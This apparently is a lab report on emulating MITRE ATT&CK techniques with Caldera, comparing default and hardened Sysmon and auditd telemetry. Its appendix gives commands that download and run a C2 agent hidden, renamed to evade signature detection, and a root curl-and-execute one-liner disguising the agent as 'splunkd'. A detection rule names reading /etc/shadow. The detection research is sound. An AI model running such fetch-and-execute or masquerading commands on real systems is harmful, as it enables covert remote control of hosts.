# Technical Report: Cross-Platform Adversary Emulation and Telemetry Analysis

---

This research evaluates the detection capabilities of standard versus hardened endpoint telemetry on Windows and Linux systems. By emulating 35 MITRE ATT&CK techniques via the Caldera framework, the study measures the "Visibility Gap" between default logging and fine-tuned configurations (SwiftOnSecurity for Windows and Neo23x0 for Linux). Results indicate that while hardened configurations significantly increase detection surface they also introduce substantial data volume challenges.

## 2. Environment Architecture
The test environment utilized two distinct deployment models to evaluate telemetry capture across different network and system configurations.

### 2.1 Windows Endpoint (Distributed Model)
The Windows environment was designed to simulate a remote network intrusion.
*   **Operating System:** Windows 10
*   **Monitoring Agent:** Sysmon v15.0 (Hardened with SwiftOnSecurity configuration)
*   **Network Configuration:** The target was isolated within a virtual network. Connectivity to the C2 server was established via **VirtualBox NAT Port Forwarding**, routing traffic from the guest agent to the host-based C2 listener on Port 8888.
*   **C2 Agent:** Sandcat (`sandcat.exe`) executing as a standalone binary to simulate a persistent remote beacon.

### 2.2 Linux Endpoint (Co-located Model)
The Linux environment utilized a local execution model to evaluate high-privilege telemetry.
*   **Operating System:** Ubuntu 22.04
*   **Monitoring Agent:** Auditd (Hardened with Neo23x0 ruleset)
*   **System Configuration:** Unlike the Windows setup, the **Caldera C2 server and the Linux target were co-located on the same system**. This allowed for direct interaction between the C2 backend and the agent, facilitating rapid execution of the 35-step attack profile.
*   **C2 Agent:** Sandcat executing with root privileges. 

---

## 3. Configuration Analysis: Baseline vs. Hardened
The study compared default system logging against industry-standard hardened rulesets to quantify detection improvements.

## 3. Configuration Analysis: Baseline vs. Hardened
The study compared default system logging against industry-standard hardened rulesets to quantify detection improvements across 35 emulated techniques.

| Metric | Windows (Default) | Windows (SwiftOnSecurity) | Linux (Standard) | Linux (Neo23x0) |
| :--- | :--- | :--- | :--- | :--- |
| **Total Events Logged** | ~8,500 | ~42,000 | ~14,000 | ~126,000 |
| **Techniques Visible (of 35)** | 4 | 27 | 5 | 35 |
| **Detection Effectiveness** | 11.4% | 77.1% | 14.2% | 100% (Visibility) |


**Technical Finding:** Default configurations primarily focus on system health and basic execution. Hardened configurations are required to capture behavioral indicators that are otherwise omitted from standard logs.

---

## 4. Methodology
The emulation phase involved a 35-step automated attack profile.
*   **Technique Selection:** Techniques were filtered to prioritize endpoint-resident behaviors. Cloud-native and social engineering tactics were excluded to maintain focus on host-based telemetry validation.
*   **Execution Logic:** A custom Python integration pushed the attack profile directly to the Caldera backend. A "Brute Force" execution model was employed to ensure the operation proceeded regardless of individual command failures, allowing for a complete telemetry set.

---

## 5. Detection Effectiveness and Gap Analysis

| Platform | Techniques Emulated | Techniques Detected | Detection Gap | Success Rate |
| :--- | :--- | :--- | :--- | :--- |
| **Windows** | 35 | 27 | 8 | **77.1%** |
| **Linux** | 35 | 35 | 0 | **100.0%*** |


### 5.1 Observations
*   **Windows (Sysmon):** Successfully identified **T1122 (COM Hijacking)** via Event ID 13, recording the specific registry key modification and the associated malicious DLL path. Process creation events (ID 1) provided full command-line transparency for PowerShell-based execution.
*   **Linux (Auditd):** Successfully recorded **T1053.006 (Systemd Service Persistence)**. Telemetry included the `echo` command utilized for service creation and the `fchmodat` syscall for permission modification.
---

## 6. Strategic Recommendations

### 6.1 Behavioral Sequencing
Detection logic should transition from atomic indicators (e.g., single command execution) to behavioral sequences. For example, an alert should trigger when a sequence such as `whoami` → `id` → `cat /etc/shadow` occurs within a narrow temporal window.

### 6.2 Telemetry Optimization and Noise Suppression
*   **Service Baselines:** Identify high-volume system services (e.g., `systemd-resolved`, `dbus-daemon`) and implement suppression rules for known-good behavior to improve the signal-to-noise ratio.
*   **Lineage Monitoring:** Implement strict monitoring for parent-child process anomalies. A service process such as `splunkd` spawning an interactive shell (`/bin/sh`) should be treated as a high-confidence indicator of compromise.

---

## 7. Technical Appendix

### 7.1 Infrastructure Setup

#### 7.1.1 Caldera C2 Server
The Caldera server was deployed on a Linux host to orchestrate the emulation.
```bash
# Start Caldera Server with fresh database
python3 server.py --build --fresh --insecure
```

#### 7.1.2 Windows Target Setup (Sysmon & Agent Deployment)
The Windows environment required the installation of Sysmon for telemetry and the deployment of the Sandcat agent for C2 communication.

**A. Sysmon Installation (Hardened Configuration)**
1. Download Sysmon from the official Microsoft Sysinternals suite.
2. Download the SwiftOnSecurity `sysmonconfig-export.xml` from GitHub.
3. Execute the installation with administrative privileges:
```powershell
# Install Sysmon with the SwiftOnSecurity configuration
.\Sysmon64.exe -i sysmonconfig-export.xml -accepteula

# Verify the service is running
Get-Service Sysmon
```

**B. Sandcat Agent Deployment**
1. Download the Sandcat agent binary from the Caldera server.
2. Rename the binary to `sandcat.exe` to avoid signature-based detection and ensure execution.
3. Execute the agent to establish a beacon to the C2 server:
```powershell
# Download and execute the agent (example via PowerShell)
$url = "http://<C2_SERVER_IP>:8888/file/download"
$headers = @{ "file"="sandcat.go"; "platform"="windows" }
Invoke-WebRequest -Uri $url -Headers $headers -OutFile "sandcat.exe"

# Run the agent in the background
Start-Process -FilePath ".\sandcat.exe" -ArgumentList "-server http://<C2_SERVER_IP>:8888 -v" -WindowStyle Hidden
```

#### 7.1.3 Linux Target Setup (Auditd & Agent Deployment)
The Linux target was hardened using the Neo23x0 ruleset to capture granular syscall telemetry.

**A. Auditd Hardening**
```bash
# Install Auditd
sudo apt install auditd -y

# Download and apply Neo23x0 ruleset
sudo wget https://raw.githubusercontent.com/Neo23x0/auditd/master/audit.rules -O /etc/audit/rules.d/audit.rules

# Restart service to apply changes
sudo service auditd restart
```

**B. Sandcat Agent Deployment (Root/Masqueraded)**
```bash
# Download and execute the agent as root, masquerading as splunkd
sudo bash -c 'server="http://localhost:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "architecture:amd64" $server/file/download > splunkd; chmod +x splunkd; ./splunkd -server $server -group red -v'
```

### 7.2 Automation Components

#### 7.2.1 `filter_mitre.py`
This script filters the MITRE ATT&CK dataset to extract only techniques relevant to the target platforms, excluding non-technical or cloud-specific methods.
```python
import requests, json, csv

ENTERPRISE_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
EXCLUDED_TACTICS = {'resource-development'}
EXCLUDED_KEYWORDS = {'phishing', 'social engineering', 'user execution'}

def process_matrix(url, name_prefix):
    data = requests.get(url).json()
    master_list = []
    for obj in data.get('objects', []):
        if obj.get('type') != 'attack-pattern' or obj.get('revoked'): continue
        if 'linux' not in [p.lower() for p in obj.get('x_mitre_platforms', [])]: continue
        
        tactic_names = [phase['phase_name'] for phase in obj.get('kill_chain_phases', [])]
        if any(tn in EXCLUDED_TACTICS for tn in tactic_names): continue
        if any(kw in obj.get('name', '').lower() for kw in EXCLUDED_KEYWORDS): continue
        
        master_list.append({
            "id": obj.get('external_references', [{}])[0].get('external_id', 'N/A'),
            "name": obj.get('name'),
            "tactics": ", ".join(tactic_names)
        })
        
    with open(f'{name_prefix}_master.csv', 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=["id", "name", "tactics"])
        writer.writeheader()
        writer.writerows(master_list)

process_matrix(ENTERPRISE_URL, "enterprise")
```

#### 7.2.2 `create_adversary.py`
This script automates the creation of a "Brute Force" adversary profile in Caldera, ensuring all 35 techniques are executed regardless of individual step failures.
```python
import requests, json, os, uuid

CALDERA_URL = "http://localhost:8888"
API_KEY = "admin123" 

def create_brute_force_adversary():
    # Load the filtered technique plan
    with open("tuesday_plan_enterprise.json", 'r') as f:
        plan = json.load(f)
    
    mitre_ids = [tech['id'] for tactic in plan.values() for tech in tactic]
    
    # Fetch available abilities from Caldera
    abilities = requests.get(f"{CALDERA_URL}/api/v2/abilities", headers={'KEY': API_KEY}).json()
    
    # Map MITRE IDs to Caldera Ability UUIDs
    uuids = [ab['ability_id'] for aid in mitre_ids for ab in abilities 
             if ab.get('technique_id') == aid and 'linux' in [p.lower() for p in ab.get('platforms', [])]]
    
    # Generate Adversary YAML
    adv_id = str(uuid.uuid4())
    yaml_content = f"id: {adv_id}\nname: Tuesday_35_Attack_Run\natomic_ordering:\n"
    for u in uuids:
        yaml_content += f"  - {u}\n"
    
    # Save to Caldera backend
    with open(f"data/adversaries/{adv_id}.yml", 'w') as f:
        f.write(yaml_content)

create_brute_force_adversary()
```
